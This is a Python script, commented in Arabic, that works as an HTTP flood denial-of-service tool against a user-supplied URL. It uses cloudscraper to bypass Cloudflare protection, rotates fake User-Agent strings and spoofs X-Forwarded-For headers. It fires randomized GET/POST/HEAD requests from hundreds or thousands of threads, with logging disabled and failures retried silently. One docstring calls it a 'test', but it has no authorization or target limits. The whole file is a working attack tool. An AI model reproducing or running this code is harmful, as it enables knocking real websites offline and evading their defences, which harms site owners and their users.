import cloudscraper
import threading
from queue import Queue
import random
import time
from fake_useragent import UserAgent

# تعطيل تسجيل الأحداث (logging)
import logging
logging.basicConfig(level=logging.CRITICAL)

# قائمة عناوين URL المستهدفة
urls = Queue()

# توليد عنوان IP عشوائي
def get_random_ip():
    """
    توليد عنوان IP عشوائي لاستخدامه في رأس الطلب.
    """
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# الحصول على User-Agent عشوائي
def get_random_user_agent():
    """
    الحصول على User-Agent عشوائي باستخدام fake_useragent.
    """
    ua = UserAgent()
    return ua.random

# إرسال الطلبات
def send_requests():
    """
    إرسال طلبات إلى الهدف مع تخطي حماية Cloudflare.
    """
    scraper = cloudscraper.create_scraper()  # إنشاء كائن Scraper
    while not urls.empty():
        url = urls.get()
        for attempt in range(5):  # إعادة المحاولة 5 مرات في حالة الفشل
            try:
                headers = {
                    "User-Agent": get_random_user_agent(),
                    "Accept-Language": "en-US,en;q=0.9",
                    "Referer": "https://www.google.com/",
                    "X-Forwarded-For": get_random_ip(),
                }
                method = random.choice(["GET", "POST", "HEAD"])
                if method == "POST":
                    # إرسال بيانات عشوائية مع طلبات POST
                    response = scraper.post(url, data={"random_data": random.randint(1, 10000)}, headers=headers, timeout=5)
                elif method == "HEAD":
                    response = scraper.head(url, headers=headers, timeout=5)
                else:
                    response = scraper.get(url, headers=headers, timeout=5)
                break  # إذا نجح الطلب، توقف عن إعادة المحاولة
            except:
                time.sleep(0.5)  # انتظر قبل إعادة المحاولة
        urls.task_done()

# الإعداد الرئيسي
def main():
    """
    الإعداد الرئيسي للاختبار.
    """
    target = input("Enter the target URL (with http/https): ").strip()
    thread_count = int(input("Enter the number of threads (recommended: 500-5000): "))
    request_count = int(input("Enter the total number of requests (recommended: 10000-100000): "))

    # التحقق من صحة المدخلات
    if thread_count <= 0 or request_count <= 0:
        print("Invalid input. The number of threads and requests must be greater than 0.")
        return

    # ملء قائمة الطلبات
    for _ in range(request_count):
        urls.put(target)

    threads = []

    # إنشاء وتشغيل الخيوط
    for _ in range(thread_count):
        thread = threading.Thread(target=send_requests)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # انتظار انتهاء جميع الطلبات
    urls.join()

if __name__ == "__main__":
    main()
